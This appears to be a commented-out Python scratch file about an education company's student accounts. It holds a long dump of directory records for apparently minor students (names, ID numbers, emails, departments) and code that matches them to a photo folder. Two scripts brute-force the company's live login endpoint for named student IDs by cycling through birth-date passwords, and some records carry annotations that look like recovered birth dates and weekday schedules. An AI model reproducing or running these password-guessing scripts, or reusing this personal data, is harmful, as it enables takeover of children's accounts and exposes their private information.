#       "userType": "Member"
#     },
#     {
#       "id": "c8e1b6a6-d5ed-46e4-8333-4c60b1a439f7",
#       "displayName": "SAMARTH SAIBOYANI(00015245192)",
#       "userPrincipalName": "00015245192@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "41d24dba-eac3-425e-93c3-fc07a67dca5a",
#       "displayName": "Samridh Srivastava (00013785627)",
#       "userPrincipalName": "00013785627@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "a0ba6390-239d-461a-b5a3-d91859a3a659",
#       "displayName": "Samridhi Malik(00011646183)",
#       "userPrincipalName": "00011646183@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "08ec6bf0-9d76-482d-a36e-75221a04e2cc",
#       "displayName": "Saranya katakam( 00005481671 )",
#       "userPrincipalName": "00005481671@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "7ef9f3e6-fc89-440e-ae5b-3cf5f493b6aa",
#       "displayName": "Sarvesh V(00015130849)",
#       "userPrincipalName": "00015130849@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "5e9f5d08-2d58-4d8a-8eeb-080f80efe693",
#       "displayName": "Sathvika Varsaa (00008418241)",
#       "userPrincipalName": "00008418241@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "6b90b647-79e8-4827-b62a-02917dbe6970",
#       "displayName": "Shaik Mohammed Diyan(00007496353)",
#       "userPrincipalName": "00007496353@aakashicampus.com",
#       "department": "BI040-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "bd2d579c-e07c-4e0a-9fdb-a52458f136de",
#       "displayName": "Shameem P K (FP08056)",
#       "userPrincipalName": "shameempk.fac@aakashicampus.com",
#       "department": "CC-082",
#       "userType": "Member"
#     },
#     {
#       "id": "2b4882d2-4cfe-46a1-a45c-9ab7f0df2545",
#       "displayName": "Sharon Emil Sathish (00013939500)",
#       "userPrincipalName": "00013939500@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "8f2f86b7-16bd-4364-b989-5f75ff39b470",
#       "displayName": "Sharveswaran Mj (00014668423)",
#       "userPrincipalName": "00014668423@aakashicampus.com",
#       "department": "CC-656",
#       "userType": "Member"
#     },
#     {
#       "id": "49508ff5-a0ea-4d30-a009-e903af0592c6",
#       "displayName": "Shivansh Pant(00009007081)",
#       "userPrincipalName": "00009007081@aakashicampus.com",
#       "department": "BI040",
#       "userType": "Member"
#     },
#     {
#       "id": "5b69f542-133d-4655-96a0-ed4dd1bf20bc",
#       "displayName": "Shlok prasad( 00010164459 )",
#       "userPrincipalName": "00010164459@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "cdaebf89-25da-4488-9291-975d81ec85ab",
#       "displayName": "SHREE MAWANDIA(00015262681)",
#       "userPrincipalName": "00015262681@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "1904e8fb-1d5f-4c4f-adab-225329118eb5",
#       "displayName": "Sidharth K Kaladharan(00014196218)",
#       "userPrincipalName": "00014196218@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "32708b48-082e-4a26-a290-4d9a437c8f1a",
#       "displayName": "Sneha Hiremath(00011769576)",
#       "userPrincipalName": "00011769576@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "d70175b3-06af-4d2c-b2e3-98023f11cf01",
#       "displayName": "sonu giri(00012758074)",
#       "userPrincipalName": "00012758074@aakashicampus.com",
#       "department": "KA654-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "7b997851-2905-43c7-bd27-70900335a909",
#       "displayName": "Sriram K(00011787986)",
#       "userPrincipalName": "00011787986@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "1a0b7ffa-c8aa-422f-bc15-257989371d80",
#       "displayName": "Srivignesh S(00014969208)",
#       "userPrincipalName": "00014969208@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "4ed70fe6-c1b5-4786-93a6-028cf142bd9e",
#       "displayName": "Stuti D S(00010069969)",
#       "userPrincipalName": "00010069969@aakashicampus.com",
#       "department": "BI040",
#       "userType": "Member"
#     },
#     {
#       "id": "01085cda-19cd-4c53-a487-54f298732813",
#       "displayName": "Sujeet Singh (FM11015)",
#       "userPrincipalName": "sujeetsingh.fac@aakashicampus.com",
#       "department": "CC-065",
#       "userType": "Member"
#     },
#     {
#       "id": "ef0e3865-1396-46be-9f75-74e4f0894a73",
#       "displayName": "Suvarna S(00014933269)",
#       "userPrincipalName": "00014933269@aakashicampus.com",
#       "department": "KA654-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "dd502bdd-fc8d-4633-bd2d-ea6880070a37",
#       "displayName": "SWADHYAY ROY(00008564460)",
#       "userPrincipalName": "00008564460@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "72d3e220-f0df-4db3-9bbc-3e4748ee960a",
#       "displayName": "Swathi Ramachandran(00012570784)",
#       "userPrincipalName": "00012570784@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "2d3c84b5-0dcb-4b5a-9f10-b65be2907527",
#       "displayName": "Syed Yusuf Rahman(00014633980)",
#       "userPrincipalName": "00014633980@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "81ad5dc2-b8d1-4e91-a20d-b631ee300e2f",
#       "displayName": "TANISHKA Tiwari(00014941149)",
#       "userPrincipalName": "00014941149@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "1228d3e7-8e69-464f-8760-c865bc3a35bd",
#       "displayName": "Tanmay Sukla (00013938763)",
#       "userPrincipalName": "00013938763@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "8cdb9784-8c4d-4549-ad7c-e4d165916e21",
#       "displayName": "Tanushri Yuvaraj (00014246813)",
#       "userPrincipalName": "00014246813@aakashicampus.com",
#       "department": "CC-064",
#       "userType": "Member"
#     },
#     {
#       "id": "683cdabf-ffb8-408e-b0dd-d61a74081114",
#       "displayName": "Tarun Kumar G(00012247371)",
#       "userPrincipalName": "00012247371@aakashicampus.com",
#       "department": "TN656-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "bc69358d-cb41-4562-bcc2-2a7a130532c8",
#       "displayName": "Tatai Pal(00012274377)",
#       "userPrincipalName": "00012274377@aakashicampus.com",
#       "department": "KL676-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "c3969cc9-ac29-4f22-a5c4-3a09856d8cd7",
#       "displayName": "Tejas Bhat(00015266463)",
#       "userPrincipalName": "00015266463@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "9e86df5f-056d-4fb4-ac5e-b1dafc8165b4",
#       "displayName": "Thanika Bajeesh(00008339378)",
#       "userPrincipalName": "00008339378@aakashicampus.com",
#       "department": "BH410",
#       "userType": "Member"
#     },
#     {
#       "id": "9ec074de-716a-4c2e-8254-22d4004a5fcd",
#       "displayName": "Thanushree Bs (00013941057)",
#       "userPrincipalName": "00013941057@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "0d232c99-04ca-4c82-97d7-a8318e419e0c",
#       "displayName": "Tharun Srivarshan R( 00010417064 )",
#       "userPrincipalName": "00010417064@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "ff9ba469-a5bd-441e-902f-45fc5659ac35",
#       "displayName": "Thavanish B(00012117200)",
#       "userPrincipalName": "00012117200@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "d3a512ed-0112-4c1c-94f7-07ed4d9e54a7",
#       "displayName": "toshan patra(00006333700)",
#       "userPrincipalName": "00006333700@aakashicampus.com",
#       "department": "BH410",
#       "userType": "Member"
#     },
#     {
#       "id": "b1c72796-0615-45ba-8c16-8d82f854ffcf",
#       "displayName": "Trisha T B (FM15173)",
#       "userPrincipalName": "trishatb.fac@aakashicampus.com",
#       "department": "TRAINEE",
#       "userType": "Member"
#     },
#     {
#       "id": "61140b99-dda0-4c2f-8d15-716f8e9ad0f4",
#       "displayName": "TRISHANTH K(00014837878)",
#       "userPrincipalName": "00014837878@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "67d6cecb-0732-4e45-8fcb-98c367adf522",
#       "displayName": "Utkarsha Mandar Pandit(00013745747)",
#       "userPrincipalName": "00013745747@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "6b848cda-d421-4ceb-9bba-749e4eaefd2a",
#       "displayName": "Vallabhasetti Srihaas(00014110196)",
#       "userPrincipalName": "00014110196@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "c2c12147-c48d-48f9-a8f0-363901ff7346",
#       "displayName": "Vedeshaa R(00014591418)",
#       "userPrincipalName": "00014591418@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "3bf21db3-ae35-4b6a-b7c6-6b012f0f1588",
#       "displayName": "Vedikka Ramesh(00013572546)",
#       "userPrincipalName": "00013572546@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "2ab2e1ff-0436-4524-926e-2d50e212ec13",
#       "displayName": "Vidita Amit Khatri(00012698041)",
#       "userPrincipalName": "00012698041@aakashicampus.com",
#       "department": "WF064-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "b39ca058-d06d-4919-a9f3-1898e5a39606",
#       "displayName": "Vihaan Vikram Gonal (00014357307)",
#       "userPrincipalName": "00014357307@aakashicampus.com",
#       "department": "CC-042",
#       "userType": "Member"
#     },
#     {
#       "id": "9a9f9638-529c-40eb-b2f8-e68fec16127b",
#       "displayName": "Vilohit Kohli (00003698372)",
#       "userPrincipalName": "00003698372@aakashicampus.com",
#       "department": "CC-064",
#       "userType": "Member"
#     },
#     {
#       "id": "575f325e-642f-46e5-9f99-94a92c42edb5",
#       "displayName": "Vineetha G N(00014909134)",
#       "userPrincipalName": "00014909134@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "c62a1324-28da-4e0a-a322-08c85ebe9dd6",
#       "displayName": "Vishnuvikash S (00014593471)",
#       "userPrincipalName": "00014593471@aakashicampus.com",
#       "department": "TN656",
#       "userType": "Member"
#     },
#     {
#       "id": "5f4d1baf-3f5e-4679-9cc4-04ff96f4f1f9",
#       "displayName": "Visvesh Khanna S (00013570533)",
#       "userPrincipalName": "00013570533@aakashicampus.com",
#       "department": "TN656",
#       "userType": "Member"
#     },
#     {
#       "id": "05288608-a28d-4418-a9c6-8ba95da6d1f4",
#       "displayName": "Vivan Kiran Shivam (00014331643)",
#       "userPrincipalName": "00014331643@aakashicampus.com",
#       "department": "BH410",
#       "userType": "Member"
#     },
#     {
#       "id": "0873f47d-b5c9-4e68-9770-545811e7ad3e",
#       "displayName": "Vyom Gupta(00006215129)",
#       "userPrincipalName": "00006215129@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "a9c59cf5-3762-47ac-9779-32566ef3a778",
#       "displayName": "Y JASHWANTH(00012964022)",
#       "userPrincipalName": "00012964022@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "468409bb-fcc9-4cd6-b54b-68a3848b6434",
#       "displayName": "YarramJayabharath Reddy(00014704921)",
#       "userPrincipalName": "00014704921@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "7e337a9b-be43-430c-9811-571f6963dad8",
#       "displayName": "Yuktha  S Maragal(00006692453)",
#       "userPrincipalName": "00006692453@aakashicampus.com",
#       "department": "BH410",
#       "userType": "Member"
#     },
#     {
#       "id": "39ed9d3c-5787-402b-a1e3-b1a4a7cc2b5d",
#       "displayName": "Yuktha N(00014602967)",
#       "userPrincipalName": "00014602967@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "49dc7b17-c9bf-472c-8a73-e4a878d7b3c7",
#       "displayName": "Yuvan S(00012886500)",
#       "userPrincipalName": "00012886500@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     }
#   ]

# avail_psids = [(i.replace(".jpg",'').split('-')[1]) for i in os.listdir("pictures") if i != '.DS_Store']

# new_d = [i for i in d if i['userPrincipalName'].split('@')[0] in avail_psids]
# import json
# print(json.dumps(new_d))




# import requests
# from datetime import datetime, timedelta
# import concurrent.futures
# import threading
# import time

# # Endpoint and credentials
# url = "https://session-service.aakash.ac.in/prod/sess/api/v2/user/session"
# username = "00014601360"
# profile = "student"

# start_date = datetime(2008, 10, 1)
# end_date = datetime(2010, 2, 1)
# delta = timedelta(days=1)

# print_lock = threading.Lock()  
# max_workers = 5  
# request_interval = 1

# date_list = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]

# def try_login(dob_date):
#     dob_password = dob_date.strftime("%d%m%y")
#     payload = {
#         "psid_or_mobile": username,
#         "password": f"Ad@{dob_password}",
#         "profile": profile
#     }
#     try:
#         response = requests.post(url, json=payload, timeout=15)
#         with print_lock:
#             print(f"{dob_password} {response.status_code} {response.text}")
#     except Exception as e:
#         with print_lock:
#             print(f"{dob_password} ERROR: {e}")
#     time.sleep(request_interval)  

# with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
#     executor.map(try_login, date_list)



# import requests
# from datetime import datetime, timedelta

# url = "https://session-service.aakash.ac.in/prod/sess/api/v2/user/session"  # Replace with the actual login endpoint
# username = "00015536508"   # Replace with the actual username
# # 00015536508@aakashicampus.com


# start_date = datetime(2008, 10, 1)
# end_date = datetime(2010, 2, 1)

# delta = timedelta(days=1)
# current_date = start_date

# while current_date <= end_date:
#     dob_password = current_date.strftime("%d%m%y")
#     payload = {
#         "psid_or_mobile": username,
#         "password": f'No@{dob_password}',
#         "profile":"student"
#     }
#     response = requests.post(url, json=payload)
#     if response.status_code != 400:
#         print()
#     print(f"{dob_password} {response.status_code} {response.text}")
#     if response.status_code != 400:
#         print()
#     # Check for successful login (customize this condition as needed)
#     # if "success" in response.text.lower():
#     #     print(f"Password found: {dob_password}")
#     #     break
#     current_date += delta

# [

#   {
#     "id": "fe48690c-d490-4278-8ef9-6fe743956bc1",
#     "displayName": "ANUSHKA TIWARY(00014542793)", # 040309 # 2-5 weekday
#     "userPrincipalName": "00014542793@aakashicampus.com",
#     "department": "BH410-2527",
#     "userType": "Member"
#   },


#   {
#     "id": "38c1bf80-b8c9-484d-8dcb-36f80a0c840a",
#     "displayName": "Pragya Sharma(00015303685)", # 250509 # 2-5 weekday
#     "userPrincipalName": "00015303685@aakashicampus.com",
#     "department": "BH410-2527",
#     "userType": "Member"
#   },

  

#   {
#     "id": "490f168a-c393-47ba-964a-12c3191d38de",
#     "displayName": "S Dayanitha(00011222108)",
#     "userPrincipalName": "00011222108@aakashicampus.com",
#     "department": "BH410-2425",
#     "userType": "Member"
#   },

#   {
#     "id": "9e86df5f-056d-4fb4-ac5e-b1dafc8165b4",
#     "displayName": "Thanika Bajeesh(00008339378)",
#     "userPrincipalName": "00008339378@aakashicampus.com",
#     "department": "BH410",
#     "userType": "Member"
#   },

#   {
#     "id": "d3a512ed-0112-4c1c-94f7-07ed4d9e54a7",
#     "displayName": "toshan patra(00006333700)",
#     "userPrincipalName": "00006333700@aakashicampus.com",
#     "department": "BH410",
#     "userType": "Member"
#   },
# {
#     "id": "aeb5c223-e5f2-4f35-816e-8fa5cd9e2d02",
#     "displayName": "Pranav R(00012241452)",
#     "userPrincipalName": "00012241452@aakashicampus.com",
#     "department": "BH083-2527",
#     "userType": "Member"
#   },

#   {
#     "id": "6602e037-4c7e-4c65-940a-0c356d197f71",
#     "displayName": "ASHWANTH KUMAR S( 00010082311 )",
#     "userPrincipalName": "00010082311@aakashicampus.com",
#     "department": "AESL1",
#     "userType": "Member"
#   },
#   {
#     "id": "22de4e40-b31b-4593-8b07-d6eda6301103",
#     "displayName": "Keshav .( 00010209346 )",
#     "userPrincipalName": "00010209346@aakashicampus.com",
#     "department": "AESL1",
#     "userType": "Member"
#   },
#   {
#     "id": "a1e09273-a629-4356-8683-c2a889c24ebc",
#     "displayName": "Manu Neeralagi( 00009448863 )",
#     "userPrincipalName": "00009448863@aakashicampus.com",
#     "department": "AESL1",
#     "userType": "Member"
#   },
#   {
#     "id": "c9b0289d-4e2d-44c3-8617-95efe04cdb73",
#     "displayName": "Mukilan V( 00010506490 )",
#     "userPrincipalName": "00010506490@aakashicampus.com",
#     "department": "AESL1",
#     "userType": "Member"
#   },
#   {
#     "id": "5a2dbc80-9c50-42da-bef2-bb56d09b6823",
#     "displayName": "NIDHEESH LAMBA.( 00010286269 )",
#     "userPrincipalName": "00010286269@aakashicampus.com",
#     "department": "AESL1",
#     "userType": "Member"
#   },
#   {
#     "id": "08ec6bf0-9d76-482d-a36e-75221a04e2cc",
#     "displayName": "Saranya katakam( 00005481671 )",
#     "userPrincipalName": "00005481671@aakashicampus.com",
#     "department": "AESL1",
#     "userType": "Member"
#   },
#   {
#     "id": "5b69f542-133d-4655-96a0-ed4dd1bf20bc",
#     "displayName": "Shlok prasad( 00010164459 )",
#     "userPrincipalName": "00010164459@aakashicampus.com",
#     "department": "AESL1",
#     "userType": "Member"
#   },
#   {
#     "id": "0d232c99-04ca-4c82-97d7-a8318e419e0c",
#     "displayName": "Tharun Srivarshan R( 00010417064 )",
#     "userPrincipalName": "00010417064@aakashicampus.com",
#     "department": "AESL1",
#     "userType": "Member"
#   }
# ]

